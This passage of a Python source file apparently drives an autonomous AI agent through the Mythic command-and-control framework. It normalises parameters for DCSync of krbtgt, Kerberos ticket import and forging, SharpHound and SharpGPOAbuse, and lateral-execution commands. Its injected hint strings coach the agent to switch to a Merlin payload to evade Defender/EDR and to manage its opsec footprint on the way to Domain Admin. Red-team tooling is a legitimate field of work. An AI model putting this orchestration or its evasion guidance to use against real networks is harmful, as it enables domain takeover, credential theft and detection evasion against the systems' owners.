        if ticket_command:
            ticket_output = await self.issue_task_and_waitfor_task_output(
                ticket_command,
                ticket_parameters,
                callback_display_id,
            )
        authorities = set(self._known_domain_authorities.get(str(callback_display_id), set()))
        authorities.update(
            str(item or "").strip()
            for item in (known_domain_authorities or ())
            if str(item or "").strip()
        )
        snapshot = auth_context.build_authentication_context(
            callback_display_id,
            host,
            identity_output,
            ticket_output,
            authorities,
            identity_parser=str(profile_value("collection_identity_parser", "apollo") or "apollo"),
        )
        self._authentication_contexts[str(callback_display_id)] = snapshot
        self._known_domain_authorities[str(callback_display_id)] = set(
            snapshot.known_domain_authorities
        )
        return snapshot

    def authentication_context(self, callback_display_id: int) -> auth_context.AuthenticationContext | None:
        """Return the latest authentication-context observation for a callback."""
        return self._authentication_contexts.get(str(callback_display_id))

    def _record_kerberos_ticket_store_context(self, command: str, callback_display_id: int, output: str) -> None:
        try:
            normalized = _normalize_command_name(command)
            low = str(output or "").casefold()
            if any(token in low for token in ("error", "fail", "exception", "invalid", "denied")):
                return
            if normalized == "ticket_store_add" and "added ticket" in low:
                self._bump_kerberos_context_epoch(callback_display_id)
            elif normalized == "ticket_cache_add" and low:
                self._bump_kerberos_context_epoch(callback_display_id)
            elif normalized in {"execute_assembly", "inline_assembly", "invoke_assembly"} and "ticket successfully imported" in low:
                self._bump_kerberos_context_epoch(callback_display_id)
            elif normalized in {
                "ticket_store_purge",
                "ticket_store_remove",
                "ticket_store_delete",
                "ticket_cache_purge",
            }:
                self._bump_kerberos_context_epoch(callback_display_id)
        except Exception:
            return

    def _kerberos_context_epoch(self, callback_display_id) -> int:
        return int(getattr(self, "_kerberos_context_epochs", {}).get(str(callback_display_id), 0) or 0)

    def _bump_kerberos_context_epoch(self, callback_display_id) -> None:
        key = str(callback_display_id)
        current = self._kerberos_context_epoch(callback_display_id)
        self._kerberos_context_epochs[key] = current + 1

    def _deterministic_capability_command_context(self, command: str, parameters) -> dict:
        try:
            return dict(
                getattr(self, "_deterministic_capability_command_contexts", {}).get(
                    _capability_command_key(command, parameters),
                    {},
                )
                or {}
            )
        except Exception:
            return {}

    def _task_failure_key(self, command: str, callback_display_id: int, parameters) -> tuple:
        try:
            serialized = self._bound_failure_parameter_signatures.get(
                _capability_command_key(command, parameters),
                (
                    json.dumps(parameters, sort_keys=True)
                    if isinstance(parameters, (dict, list))
                    else str(parameters)
                ),
            )
        except Exception:
            serialized = str(parameters)
        key = (command, callback_display_id, serialized)
        context = self._deterministic_capability_command_context(command, parameters)
        capability = self._capability_text(context.get("capability")).casefold()
        expected_probe = self._capability_text(context.get("expected_probe")).casefold()
        produces = {self._capability_text(item).casefold() for item in context.get("produces", []) or []}
        if (
            expected_probe in {"extract_ticket_probe", "extract_adcs_certificate_auth_probe"}
            and "kerberos_service_access_probe" in produces
        ):
            key = key + ("kerberos_context_epoch", self._kerberos_context_epoch(callback_display_id))
        return key

    async def _callback_tasking_liveness_blocker(self, callback_display_id: int) -> str:
        """Return a STOP message when a callback is known not to be taskable."""
        try:
            if self.client is None:
                return ""
            result = await assess_callback_liveness(self.client, int(callback_display_id))
            if not isinstance(result, dict):
                return ""
            status = self._capability_text(result.get("status")).casefold()
            reason = self._capability_text(result.get("reason"))
            # Assessment transport errors should not become a hard tasking veto. Concrete Mythic facts
            # such as stale last_checkin, missing callback row, or likely-crashed status should.
            if reason.casefold().startswith("could not assess callback"):
                return ""
            stale_status = status in {"dead", "likely_crashed"}
            missing_or_uncertain = (
                status == "uncertain"
                and (
                    "not found" in reason.casefold()
                    or "no usable last_checkin" in reason.casefold()
                )
            )
            if not (stale_status or missing_or_uncertain):
                return ""
            return (
                f"STOP — callback {callback_display_id} is not taskable: {status or 'unknown'}; {reason}. "
                "Do not issue more tasks to this callback. Use list_callbacks/check_callback_alive to select "
                "a live callback, or obtain a new callback if the payload was killed."
            )
        except Exception:
            return ""

    def _format_task_stop(
        self,
        fail_key,
        command: str,
        callback_display_id: int,
        result_class: str,
        reason: str,
        repair_hint: str | None = None,
    ) -> str:
        if result_class == command_builder.ResultClass.GENUINE.value:
            return f"genuine failure — not retrying: {reason}"
        if result_class == command_builder.ResultClass.CONSTRUCTION.value:
            hint = f" {repair_hint}" if repair_hint else ""
            return (
                f"STOP — construction failure for command '{command}' on callback "
                f"{callback_display_id}; not retrying identical parameters.{hint}"
            )
        count = self._task_failure_counts.get(fail_key, 2)
        return (
            f"STOP — command '{command}' on callback {callback_display_id} with these parameters has already "
            f"failed {count} times. Do NOT re-issue it "
            f"with cosmetically different empty parameters ({{}}, '', '\"\"' are all equivalent to 'no arguments'). "
            f"The failure appears transient but has hit the bounded retry cap. Report this to the operator, check "
            f"callback/task status, or choose a different approach. Last failure: {reason}"
        )

    async def _construction_repair_hint(self, command, parameters, callback_display_id, fallback: str = "") -> str | None:
        try:
            if not isinstance(parameters, dict) or not parameters:
                return fallback or None
            param_schema = await self._fetch_command_schema(command, callback_display_id)
            if not param_schema:
                return fallback or None
            resolved = command_builder.resolve_params(param_schema, parameters, command=command)
            if resolved.repair:
                return f"Repair hint: {resolved.repair}"
            if resolved.notes:
                return f"Resolver notes: {resolved.notes}"
            return fallback or None
        except Exception:
            return fallback or None

    @staticmethod
    def _single_required_string_schema_parameter(param_schema) -> dict | None:
        if not isinstance(param_schema, list):
            return None
        groups: dict[str, list[dict]] = {}
        for param in param_schema:
            if not isinstance(param, dict):
                continue
            group = str(param.get("parameter_group_name") or "Default")
            groups.setdefault(group, []).append(param)
        candidates: list[dict] = []
        for params in groups.values():
            required = [
                param for param in params
                if bool(param.get("required")) and param.get("default_value") in (None, "")
            ]
            if len(required) != 1:
                continue
            candidate = required[0]
            if str(candidate.get("type") or "String").casefold() != "string":
                continue
            candidates.append(candidate)
        if len(candidates) != 1:
            return None
        return candidates[0]

    def _schema_single_string_parameters(self, command, parameters, param_schema):
        if not isinstance(parameters, str) or not parameters.strip():
            return None
        candidate = self._single_required_string_schema_parameter(param_schema)
        if not candidate:
            return None
        supplied_key = str(candidate.get("name") or candidate.get("cli_name") or "").strip()
        if not supplied_key:
            return None
        resolved = command_builder.resolve_params(
            param_schema,
            {supplied_key: parameters},
            command=command,
        )
        if not resolved.ok or not isinstance(resolved.params, dict) or not resolved.params:
            return None
        return resolved.params

    async def _coerce_shell_parameters_from_schema(self, command, parameters, callback_display_id):
        if _normalize_command_name(command) != "shell" or not isinstance(parameters, str) or not parameters.strip():
            return parameters
        param_schema = await self._fetch_command_schema(command, callback_display_id)
        repaired = self._schema_single_string_parameters(command, parameters, param_schema)
        if repaired is None:
            return parameters
        logger.debug(
            "🛡️ ARGRES wrapped shell command line into schema-backed parameters command=%s callback=%s keys=%s",
            command,
            callback_display_id,
            sorted(repaired.keys()),
        )
        return repaired

    async def _construction_repair_parameters(self, command, parameters, callback_display_id, output: str):
        if command_builder.classify_result(command, output) != command_builder.ResultClass.CONSTRUCTION.value:
            return None
        param_schema = await self._fetch_command_schema(command, callback_display_id)
        if not param_schema:
            return None
        if isinstance(parameters, dict) and parameters:
            resolved = command_builder.resolve_params(param_schema, parameters, command=command)
            if resolved.ok and resolved.params != parameters:
                return resolved.params, "rebuild_with_payload_schema"
        repaired = self._schema_single_string_parameters(command, parameters, param_schema)
        if repaired is not None and repaired != parameters:
            return repaired, "rebuild_with_payload_schema"
        return None

    async def issue_task_and_waitfor_task_output(
        self,
        command: str,
        parameters: str | dict,
        callback_display_id: int,
        token_id: int | None = None,
        timeout: int | None = None,
        visibility_context: dict | None = None,
    ) -> str:
        """Issue `command` on the agent at `callback_display_id` and wait for its output.

        Caveat: for a parameter of type "File" pass the Mythic file UUID, not a filename. Format
        `parameters` as a JSON string of name/value pairs (e.g. {"arguments": "value"}) or a CLI-style
        string using each parameter's cli_name (e.g. -path /etc/issue). token_id impersonates a tracked
        Windows token; timeout is in seconds.
        """
        self._pending_task_backed_transition = None
        # Deterministically normalize a dcsync target /user to NETBIOS\sAMAccountName (NORTH\krbtgt) no matter
        # how the agent built the command — the bare/FQDN/DN forms cause CrackNames ERROR_NOT_UNIQUE / BAD_DN.
        try:
            parameters = self._qualify_dcsync_params(command, parameters)
        except Exception:
            pass  # fail-open: never block the issue path on normalization
        # A native `dcsync` from the model is often a freeform string or a dc-less dict that Apollo rejects
        # ("No mimikatz command given"); coerce it into the proven {domain, user:NETBIOS\\acct, dc} dict.
        try:
            parameters = await self._coerce_native_dcsync_to_working_form(command, parameters)
        except Exception:
            pass  # fail-open
        try:
            parameters = self._normalize_sharphound_assembly_params(command, parameters)
        except Exception:
            pass  # fail-open: never block the issue path on SharpHound argument normalization
        try:
            _hook_result = await self._engagement_issue_hook(command, parameters, callback_display_id)
        except Exception:
            _hook_result = None  # fail-open: any hook error => proceed normally
        if _hook_result is not None:
            self._pending_task_backed_transition = None
            return _hook_result

        liveness_blocker = await self._callback_tasking_liveness_blocker(callback_display_id)
        if liveness_blocker:
            self._pending_task_backed_transition = None
            return liveness_blocker

        # A command is about to be issued → new state will exist → start a fresh recon epoch so a single
        # legitimate post-action re-read of history/callbacks is allowed again (the guard only fires on
        # REPEATED reads within one epoch).
        self._recon_epoch += 1

        # HITL: guarded
        if timeout is None:
            timeout = 300  # Default timeout of 5 minutes

        # Normalize "no arguments" to an empty string. Trace evidence (2026-06-01) shows
        # argument-less Apollo commands (rev2self, whoami) SUCCEED with parameters="" but
        # FAIL with parameters={} ("rev2self takes no command line arguments") because an
        # empty dict serializes to a non-empty argument. Collapse every empty form to "".
        if parameters is None or parameters == {} or (
            isinstance(parameters, str) and parameters.strip() in ("", "{}", '""', "''")
        ):
            parameters = ""

        # If the model passed parameters as a JSON OBJECT string (e.g. '{"command": "gpupdate /force"}'),
        # parse it to a dict so the deterministic resolver below applies. Otherwise a string-form param with
        # prior-key names bypasses the resolver (isinstance dict == False) and reaches Mythic literally — which
        # is exactly how {"command": ...} got stringified into a "'{\"command\":' is not recognized" failure.
        # Only JSON objects are parsed; bare command-lines ("gpupdate /force") and dash-strings ("-path /x")
        # do not start with "{" and pass through unchanged for Mythic's own CLI parsing.
        if isinstance(parameters, str):
            _stripped = parameters.strip()
            if _stripped.startswith("{") and _stripped.endswith("}"):
                try:
                    _parsed = json.loads(_stripped)
                    if isinstance(_parsed, dict):
                        parameters = _parsed
                except (ValueError, TypeError):
                    pass

        # Apollo `run` executes a native binary. Shell builtins/chains (`dir`, `&&`, `cmd.exe /c ...`) must go
        # through `shell`; otherwise Mythic starts a process named "dir" or sends a literal JSON object to cmd.
        try:
            command, parameters = self._rewrite_shell_like_run(command, parameters)
            parameters = await self._coerce_shell_parameters_from_schema(command, parameters, callback_display_id)
        except Exception:
            pass
        try:
            live_command = await self._authenticate_live_command(command, callback_display_id)
            if live_command.get("status") == "missing":
                self._pending_task_backed_transition = None
                return self._missing_live_command_message(command, live_command.get("payload_type"), callback_display_id)
            if live_command.get("status") == "available" and live_command.get("command"):
                command = live_command["command"]
        except Exception:
            pass
        raw_gpo_blocker = self._raw_gpo_mutation_blocker(command, parameters)
        if raw_gpo_blocker:
            self._pending_task_backed_transition = None
            return raw_gpo_blocker

        # Circuit breaker: refuse to re-issue a command that has already failed repeatedly
        # with the same (normalized) parameters on the same callback. Without this, a
        # transient "Failed to create task" or a parse error sends the model into an
        # unbounded retry loop (cosmetic param permutations) that explodes context and
        # exhausts the recursion limit.
        fail_key = self._task_failure_key(command, callback_display_id, parameters)
        if self._task_failure_counts.get(fail_key, 0) >= 2:
            return (
                f"STOP — command '{command}' on callback {callback_display_id} with these parameters has already "
                f"failed {self._task_failure_counts[fail_key]} times. Do NOT re-issue it with cosmetically different "
                f"empty parameters ({{}}, '', '\"\"' are all equivalent to 'no arguments'). The parameter format is "
                f"likely wrong or the failure is environmental. Report this to the operator, consult "
                f"get_all_commands_for_payloadtype for the correct parameter schema, or choose a different approach."
            )

        # Registered-file commands often expose a ChooseOne selector whose choices are populated from Mythic
        # filemeta. Satisfy that control-plane prerequisite before argument resolution; otherwise the resolver
        # can reject an unregistered tool name before Sage gets a chance to register it.
        try:
            registered_file_blocker = await self._ensure_registered_file_available(
                command,
                parameters,
                callback_display_id,
            )
        except Exception as e:
            registered_file_blocker = (
                f"{_REGISTERED_FILE_PREFLIGHT_PREFIX} could not verify registered-file prerequisites "
                f"for command {command!r}: {type(e).__name__}: {e}"
            )
            logger.warning(registered_file_blocker)
        if registered_file_blocker:
            return registered_file_blocker

        # Deterministic pre-flight: first repair prior-key names and group mixes against the
        # live schema, then keep the existing validator as the conservative hard stop.
        if isinstance(parameters, dict) and parameters:
            try:
                param_schema = await self._fetch_command_schema(command, callback_display_id)
                if param_schema:
                    original_parameters = dict(parameters)
                    resolved = command_builder.resolve_params(param_schema, parameters, command=command)
                    if resolved.ok:
                        parameters = resolved.params
                        parameters = await self._bind_mythic_credential_parameters(
                            command,
                            parameters,
                            callback_display_id,
                            param_schema=param_schema,
                        )
                        if parameters != original_parameters:
                            logger.debug(
                                f"🛡️ ARGRES command={command} group={resolved.group} "
                                f"params={sorted(parameters.keys())} notes={resolved.notes}"
                            )
                            fail_key = self._task_failure_key(command, callback_display_id, parameters)
                            if self._task_failure_counts.get(fail_key, 0) >= 2:
                                return (
                                    f"STOP — command '{command}' on callback {callback_display_id} with these parameters has already "
                                    f"failed {self._task_failure_counts[fail_key]} times. Do NOT re-issue it with cosmetically different "
                                    f"empty parameters ({{}}, '', '\"\"' are all equivalent to 'no arguments'). The parameter format is "
                                    f"likely wrong or the failure is environmental. Report this to the operator, consult "
                                    f"get_all_commands_for_payloadtype for the correct parameter schema, or choose a different approach."
                                )
                    else:
                        result_class = command_builder.classify_result(command, resolved.repair or "")
                        decision = self._apply_task_result_class(fail_key, result_class)
                        if decision == "stop":
                            return self._format_task_stop(
                                fail_key,
                                command,
                                callback_display_id,
                                result_class,
                                resolved.repair or f"Invalid parameters for command '{command}'.",
                                resolved.repair,
                            )
                        return resolved.repair or f"Invalid parameters for command '{command}'."
            except Exception as e:
                try:
                    logger.info(f"🛡️ ARGRES failed_open command={command} reason=exception:{e}")
                except Exception:
                    pass
            _validation_error = await self._validate_command_parameters(command, parameters, callback_display_id)
            if _validation_error:
                result_class = command_builder.classify_result(command, _validation_error)
                decision = self._apply_task_result_class(fail_key, result_class)
                if decision == "stop":
                    return self._format_task_stop(
                        fail_key,
                        command,
                        callback_display_id,
                        result_class,
                        _validation_error,
                        _validation_error,
                    )
                return _validation_error

        parameters = self._bind_kerberos_ticket_artifact(command, parameters)
        fail_key = self._task_failure_key(command, callback_display_id, parameters)
        if self._task_failure_counts.get(fail_key, 0) >= 2:
            return (
                f"STOP — command '{command}' on callback {callback_display_id} with these parameters has already "
                f"failed {self._task_failure_counts[fail_key]} times. Do NOT re-issue it with cosmetically different "
                f"empty parameters ({{}}, '', '\"\"' are all equivalent to 'no arguments'). The parameter format is "
                f"likely wrong or the failure is environmental. Report this to the operator, consult "
                f"get_all_commands_for_payloadtype for the correct parameter schema, or choose a different approach."
            )

        logon_context_key = self._kerberos_logon_context_key(command, callback_display_id, parameters)
        if logon_context_key and logon_context_key in self._kerberos_logon_context_keys:
            return (
                "STOP — a matching NetOnly Kerberos logon context was already created on this callback "
                f"for {logon_context_key[2]}@{logon_context_key[1]}. Do not create another one. "
                "Validate/reuse the existing context with ticket_store_list and the context-bound service "
                "proof, or run rev2self first if you intentionally need to abandon the current context."
            )

        # Loop-guard pre-issue refusal: this exact action already tripped the unproductive-repeat limit and has
        # not been cleared by intervening progress. Refuse to re-issue it (the failure breaker can't, because
        # the command SUCCEEDS) so a post-success loop (e.g. `shell klist`) cannot keep consuming the budget.
        _loop_action_key = self._unproductive_action_key(command, callback_display_id, parameters)
        if _loop_action_key in self._unproductive_tripped:
            return (
                f"STOP — '{command}' on callback {callback_display_id} was already flagged as an unproductive "
                f"loop (it returned the same output {self._unproductive_repeat_limit}× with no new progress). Do "
                f"NOT re-issue it. If the objective is satisfied, report the proof chain and call "
                f"handback_to_supervisor; otherwise take a DIFFERENT next action or handback with a concrete "
                f"named blocker."
            )

        _fp = await self._action_footprint(command, parameters, callback_display_id)
        self._ledger_record(command, callback_display_id, parameters, _fp)

        try:
            if self.client is None:
                raise Exception("MythicAPIClient not initialized. Call create() first.")
            logger.debug(f"🛠️ Calling issue_task_and_waitfor_task_output tool for command: {command} on callback_display_id: {callback_display_id}")
            # The Mythic lib's own `timeout` does not reliably fire — its waitfor subscription can
            # block indefinitely when a task never reaches a terminal state (the documented
            # "waitfor poller hang" that wedges the whole agent graph). Wrap it in an asyncio hard
            # ceiling so the await can ALWAYS be cancelled and we surface a timeout instead of hanging.
            try:
                # Split issue + wait (faithful to mythic.issue_task_and_waitfor_task_output) so we can capture
                # the Mythic task display_id for engagement-hop evidence. The whole thing stays under the
                # asyncio hard ceiling so the poller-hang protection is unchanged.
                self._last_issued_callback_id = callback_display_id
                self._last_issued_task_display_id = None
                self._last_issued_task_terminal_status = ""
                self._last_issued_command = command

                async def _issue_and_wait():
                    nonlocal parameters
                    try:
                        task = await mythic.issue_task(
                            mythic=self.client, command_name=command, parameters=parameters,
                            callback_display_id=callback_display_id, wait_for_complete=False, timeout=timeout,
                        )  # token_id=token_id
                    except Exception as exc:
                        if not self._is_mythic_credential_reference_rejection(exc):
                            raise
                        repaired = await self._bind_mythic_credential_parameters(
                            command,
                            parameters,
                            callback_display_id,
                            force_refresh=True,
                        )
                        if repaired == parameters:
                            raise
                        parameters = repaired
                        task = await mythic.issue_task(
                            mythic=self.client, command_name=command, parameters=parameters,
                            callback_display_id=callback_display_id, wait_for_complete=False, timeout=timeout,
                        )  # token_id=token_id
                    tdid = task.get("display_id") if isinstance(task, dict) else None
                    if tdid is None:
                        raise Exception("Failed to create task")
                    self._last_issued_task_display_id = tdid
                    self._commit_task_backed_transition(command, parameters, callback_display_id, tdid)
                    event_id = f"mythic-task:{callback_display_id}:{tdid}"
                    context = (
                        visibility_context
                        if isinstance(visibility_context, dict)
                        else (_task_visibility_context.get() or {})
                    )
                    policy_decision = (
                        context.get("policy_decision")
                        if isinstance(context.get("policy_decision"), dict)
                        else {}
                    )
                    base_event = {
                        "event_id": event_id,
                        "source": "mythic",
                        "tool_name": command,
                        "callback_id": callback_display_id,
                        "task_id": tdid,
                        "parameters": parameters,
                        "capability": self._capability_text(context.get("capability")),
                        "purpose": self._capability_text(context.get("purpose")),
                        "episode_id": self._capability_text(policy_decision.get("episode_id")),
                        "decision_id": self._capability_text(policy_decision.get("decision_id")),
                        "policy_mode": self._capability_text(policy_decision.get("policy_mode")),
                        "transaction_id": self._capability_text(context.get("transaction_id")),
                    }
                    await self._notify_execution_observer({**base_event, "status": "started"})
                    try:
                        result = await mythic.waitfor_for_task_output(
                            mythic=self.client, task_display_id=tdid, timeout=timeout,
                        )
                    except BaseException as exc:
                        await self._notify_execution_observer(
                            {
                                **base_event,
                                "status": "error",
                                "terminal_status": "failed",
                                "result_preview": f"{type(exc).__name__}: {exc}",
                                "output": f"{type(exc).__name__}: {exc}",
                            }
                        )
                        raise
                    result_text = _task_output_text(result)
                    result_class = command_builder.classify_result(command, result_text)
                    self._last_issued_task_terminal_status = (
                        "completed"
                        if result_class == command_builder.ResultClass.SUCCESS.value
                        else "failed"
                    )
                    await self._notify_execution_observer({
                        **base_event,
                        "status": (
                            "completed"
                            if result_class == command_builder.ResultClass.SUCCESS.value
                            else "error"
                        ),
                        "terminal_status": self._last_issued_task_terminal_status,
                        "result_preview": result_text,
                        "output": result_text,
                    })
                    return result

                results = await asyncio.wait_for(_issue_and_wait(), timeout=timeout + 20)
                fail_key = self._task_failure_key(command, callback_display_id, parameters)
            except asyncio.TimeoutError:
                timeout_result = (
                    f"Timed out after ~{timeout}s waiting for output of '{command}' on callback "
                    f"{callback_display_id}. The task was issued but did not return output in time "
                    f"(the agent may be slow/long-running, or unresponsive). Use check_callback_alive "
                    f"and get_task_history_for_callback to check status; do NOT blindly re-issue."
                )
                result_class = command_builder.classify_result(command, timeout_result)
                decision = self._apply_task_result_class(fail_key, result_class)
                if decision == "stop":
                    return self._format_task_stop(
                        fail_key,
                        command,
                        callback_display_id,
                        result_class,
                        timeout_result,
                    )
                return timeout_result
            if results is None:
                result_class = command_builder.classify_result(command, "No output returned from task.")
                decision = self._apply_task_result_class(fail_key, result_class)
                if decision == "stop":
                    return self._format_task_stop(
                        fail_key,
                        command,
                        callback_display_id,
                        result_class,
                        "No results returned from task.",
                    )
                return "No results returned from task."
            results_str = _task_output_text(results)
            if (
                getattr(self, "_pending_engagement_hop", None)
                and self._pending_engagement_hop[0] == "gpo-abuse"
                and _gpo_abuse_guid_only_noop(results_str)
            ):
                results_str += (
                    "\n\n[SAGE RESULT] invalid parameters/no-op: SharpGPOAbuse only resolved the domain/DC/GPO "
                    "GUID and did not report any GPO modification, ScheduledTasks.xml write, version bump, or "
                    "success marker. Do NOT wait for Group Policy refresh on this output. Treat this attempt as "
                    "failed/no-op; rebuild this capability with build_capability_commands inputs "
                    "{\"method\":\"gpp-immediate-task-fallback\", \"gpo_guid\":\"<GUID from this output>\"} "
                    "to emit deterministic GPP XML/CSE/version repair plus proof-read commands, or choose a "
                    "different action."
                )
            elif (
                getattr(self, "_pending_engagement_hop", None)
                and self._pending_engagement_hop[0] == "gpo-abuse"
                and _gpo_abuse_setup_needs_proof(results_str)
            ):
                results_str += (
                    "\n\n[SAGE RESULT] GPO setup pending: SharpGPOAbuse modified the GPO setup artifact, "
                    "but this is not SYSTEM execution proof. Do NOT stop, mark the capability complete, or "
                    "DCSync yet. Wait for Group Policy to apply with wait_for_seconds (300 seconds by default "
                    "for a DC-scoped policy), then run an explicit effect proof such as the requested proof-file "
                    "read or `net group \"Domain Admins\" /domain`. If this was a deterministic fallback plan, "
                    "continue issuing the returned gpupdate/proof-read commands in order."
                )
            self._cache_kerberos_ticket_artifact(command, parameters, results_str)
            self._record_kerberos_logon_context(command, callback_display_id, parameters, results_str)
            self._record_kerberos_ticket_store_context(command, callback_display_id, results_str)
            self._record_deterministic_capability_command_result(command, parameters, callback_display_id, results_str)
            # Agent-side execution errors come back in the OUTPUT (not as exceptions); count
            # them toward the circuit breaker so blind retries are still capped.
            result_class = command_builder.classify_result(command, results_str)
            decision = self._apply_task_result_class(fail_key, result_class)
            # Loop-guard: detect a SUCCESSFUL-but-unproductive repeat (same command/params/normalized output)
            # that the failure breaker resets past. On the Nth identical success, surface a STOP nudge and flag
            # the action so the pre-issue guard refuses further repeats.
            _unprod_nudge = self._unproductive_repeat_nudge(
                command, callback_display_id, parameters, results_str, result_class
            )
            if _unprod_nudge:
                results_str += f"\n\n[SAGE LOOP-GUARD] {_unprod_nudge}"
            if result_class == command_builder.ResultClass.CONSTRUCTION.value:
                repair_hint = await self._construction_repair_hint(command, parameters, callback_display_id, results_str)
                if decision == "stop":
                    return self._format_task_stop(
                        fail_key,
                        command,
                        callback_display_id,
                        result_class,
                        results_str,
                        repair_hint,
                    )
                if repair_hint:
                    results_str += f"\n\n[SAGE REPAIR] {repair_hint}"
            elif decision == "stop":
                return self._format_task_stop(
                    fail_key,
                    command,
                    callback_display_id,
                    result_class,
                    results_str,
                )
            # Reactive AV/Defender hint: a remote-exec/lateral command that was issued but failed at the
            # EXECUTION layer (not arg-format) on a Windows host is a classic .NET-beacon-quarantined signal.
            # Surface Merlin (Go) as the actionable alternative so the agent doesn't re-permute Apollo args.
            _EXEC_LAT_CMDS = {"jump_wmi", "jump_psexec", "wmiexecute", "execute_assembly", "inline_assembly", "shinject", "spawn", "inject"}
            if command in _EXEC_LAT_CMDS and _is_task_failure_output(results_str):
                _low = results_str.lower()
                if ("failed to execute" in _low) or ("wmi" in _low and "fail" in _low) or ("access is denied" in _low) or ("service" in _low and "fail" in _low):
                    results_str += (
                        "\n\n[SAGE HINT] This command was issued and failed at the EXECUTION layer (not an "
                        "argument-format error). On a Defender/EDR-protected Windows host this commonly means the "
                        "Apollo (.NET) beacon was quarantined. Do NOT re-permute these arguments. Consider building a "
                        "Merlin (Go) payload for this host (distinct EDR signature) and delivering it on the next hop — "
                        "see the Mythic_Payload agent's Defender/EDR evasion doctrine."
                    )
                    logger.info(f"🛡️ ARGVAL av_hint command={command} callback={callback_display_id}")
            try:
                if _fp:
                    _ax = _fp["axes"]
                    if _fp["total"] >= 4 or _ax["new_beacon"] >= 3 or _ax["disk_artifact"] >= 2:
                        _adv = f"\n\n[SAGE OPSEC] footprint total={_fp['total']} axes={_ax}."
                        if _ax["new_beacon"] >= 3:
                            _adv += (" You are planting a NEW beacon. If your goal is to RUN a tool/command on the"
                                     " target, prefer remote execution (upload the tool, execute it in place, write"
                                     " output to a file, download the file, then delete it) — it avoids a persistent"
                                     " new beacon and is quieter. Plant a beacon only if you need ongoing access or"
                                     " network reach on that host that you cannot obtain remotely; state that"
                                     " justification when you do.")
                        if _ax["disk_artifact"] >= 1 or _ax["new_beacon"] >= 1:
                            _adv += " This action was recorded to the artifact ledger — clean it up at sub-goal completion (list_open_artifacts)."
                        results_str = str(results_str) + _adv
                        logger.info(f"🛡️ OPSEC annotated command={command} footprint_total={_fp['total']} axes={_ax}")
            except Exception:
                pass
            try:
                self._record_engagement_success(results_str)
            except Exception:
                pass  # fail-open: recording must never break the issue path
            try:
                self._apply_contradiction_downgrade(command, parameters, results_str)
            except Exception:
                pass  # fail-open: a downgrade must never break the issue path
            return results_str
        except Exception as e:
            error_result = f"Error issuing command '{command}' to agent {callback_display_id}: {e}"
            result_class = command_builder.classify_result(command, error_result, str(e))
            decision = self._apply_task_result_class(fail_key, result_class)
            if decision == "stop":
                return self._format_task_stop(
                    fail_key,
                    command,
                    callback_display_id,
                    result_class,
                    error_result,
                )
            return error_result

    async def _engagement_issue_hook(self, command, parameters, callback_display_id) -> str | None:
        self._pending_engagement_hop = None
        try:
            try:
                from . import access_reconciler, engagement_state, intent_classifier
            except ImportError:
                import access_reconciler
                import engagement_state
                import intent_classifier
        except Exception:
            return None

        classified = intent_classifier.classify_tool_call(command, parameters)
        ticket_key = _ticket_command_key(command, parameters)
        if ticket_key and ticket_key not in getattr(self, "_deterministic_ticket_command_keys", set()):
            self._pending_engagement_hop = None
            return (
                "[engagement-gate] Kerberos ticket command not attempted: ticket artifact commands must be "
                "built with `build_capability_commands` and issued exactly as returned. Do not handcraft "
                "Rubeus/Mimikatz ticket commands or add pass-the-ticket flags; use the builder's isolated "
                "logon-context/ticket-store sequence and proof command."
            )
        if classified is None:
            return None

        # Resolve the durable-ledger key from the current Mythic operation (and reload the ledger under
        # it) before the first issue-time decision — __init__ loaded under 'default' with no client yet.
        await self._ensure_engagement_key()

        technique, target_key = classified
        now = datetime.now(timezone.utc).isoformat()
        try:
            footholds = await access_reconciler.reconcile_access(self, now)
        except Exception:
            footholds = []

        # Cache the reconciled footholds so the per-turn state render (model.py) can show them without
        # an extra reconcile round-trip on every model call. Best-effort; never blocks the gate.
        try:
            self._engagement_footholds = list(footholds)
        except Exception:
            pass

        # collect-graph: deterministic collect-once-per-privilege for autonomous progression. Rebind the empty
        # target to the issuing callback's access-context key; block only if a collection is in-flight or a
        # verified graph exists for this access level and the cached graph corroborates that collection. A real
        # user turn that explicitly requests a new collection gets one fresh transaction override; that keeps
        # collect-once as the default without turning it into a veto against operator intent. graph-built is
        # recorded by ingest_collection on graph_verified (not on SharpHound success), so we do NOT set a pending
        # hop here.
        if technique == "collect-graph":
            graph_facts = list(getattr(self, "_engagement_graph_facts", []) or [])
            cg_state = engagement_state.EngagementState(
                objective=self._engagement_objective(),
                footholds=footholds,
                hops=list(self._engagement_hops),
                graph_facts=graph_facts,
                engagement_id=self._eng_key(),
                runtime_scope=True,
            )
            fh = next(
                (f for f in footholds if str(getattr(f, "callback_id", "")) == str(callback_display_id)), None
            )
            scope_domain = str(target_key or "").strip().casefold()
            collection_key = (
                engagement_state.collection_target_key(cg_state, fh, scope_domain)
                if fh is not None else ""
            )
            if not collection_key:
                return None  # can't key it — fail-open, allow the collection
            in_flight_blocker = await self._collection_in_flight_blocker(collection_key)
            if in_flight_blocker:
                return in_flight_blocker
            if engagement_state.graph_collection_covers_scope(cg_state, fh, scope_domain):
                if not self._operator_collection_override_available():
                    return (f"[engagement-gate] skipped: graph already built for this auth context/scope ({collection_key}) "
                            "— analyze the existing graph or escalate; do NOT re-collect.")
                logger.info(
                    "🧭 [operator-collection] overriding graph-built skip for explicit user request key=%s",
                    collection_key,
                )
            self._authorize_operator_collection(collection_key, callback_display_id, parameters)
            self._queue_task_backed_transition(
                kind="collect-graph",
                key=collection_key,
                callback_display_id=callback_display_id,
            )
            self._pending_engagement_hop = None
            return None

        # Host-scoped techniques (e.g. lsass-dump) usually carry no host in the tool args — the
        # target host is the callback's own host. Rebind the target from the matching foothold so
        # the precondition (system-or-admin:<host>) resolves instead of false-DEFERing on an empty host.
        if not target_key:
            cb_host = next(
                (f.host for f in footholds if str(getattr(f, "callback_id", "")) == str(callback_display_id)),
                "",
            )
            if cb_host:
                rebind = intent_classifier.classify_tool_call(command, parameters, callback_host=cb_host)
                if rebind is not None:
                    technique, target_key = rebind

        # Domain Admin group membership checks are domain-scoped read-probes, but the command commonly
        # carries only `/domain`. Bind them from the issuing callback's forest so a successful read records
        # `da:<domain>` instead of an empty-target no-op.
        if not target_key and technique == "domain-admin-membership-check":
            cb_forest = next(
                (f.forest for f in footholds if str(getattr(f, "callback_id", "")) == str(callback_display_id)),
                "",
            )
            if cb_forest:
                target_key = str(cb_forest).strip().casefold()

        if technique in {"golden-ticket", "sid-history-escalation"} and (
            not ticket_key or ticket_key not in getattr(self, "_deterministic_ticket_command_keys", set())
        ):
            self._pending_engagement_hop = None
            return (
                "[engagement-gate] ticket forge not attempted: golden-ticket/SID-history commands must be "
